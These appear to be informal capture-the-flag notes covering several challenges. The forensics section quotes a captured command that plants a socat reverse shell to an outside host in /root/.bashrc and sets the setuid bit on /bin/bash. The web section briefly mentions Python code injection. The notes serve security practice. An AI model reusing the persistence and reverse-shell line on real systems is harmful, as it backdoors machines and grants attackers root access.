# Forensics
By using strings on the pcap file, there was some code which had been sent to the destination IP. Using `strings` it was possible to see the code which was sent:
```
echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash
```
So by simply reversing the base64 string and decoding it you would get the flag.

# Rev
For the rev challenge there was a binary called _meeting_. By calling `strings meeting` there was a password in plaintext:
_sup3r_s3cr3t_p455w0rd_f0r_u!_. By inputting this when prompted for a password when running the binary, a shell was spawned and it was possible to read the flag.txt file and get the flag. (missing screenshots)

# Web
This challenge was a webapp written in flask and with json.
There was a vulnerability in the code, whch allowed for python code to be injected into the 'operator' parameter of the POST request
![[HTB_web1_flag.png]]


# pwn
I can tell it is a very easy challenge, I just am not sure where to start. I think there is some manipulation of the coins required, as there is a value (not quite sure what) that is compared to the coins for the flag to be returned...
To try: pwn_cyclic


# Crypto
This gave both a binary file which has the encryption method algorithm, as well as a file with an example of encrypted text.
Dont know where to start --> reversing of some kind. Or it might be a well known one.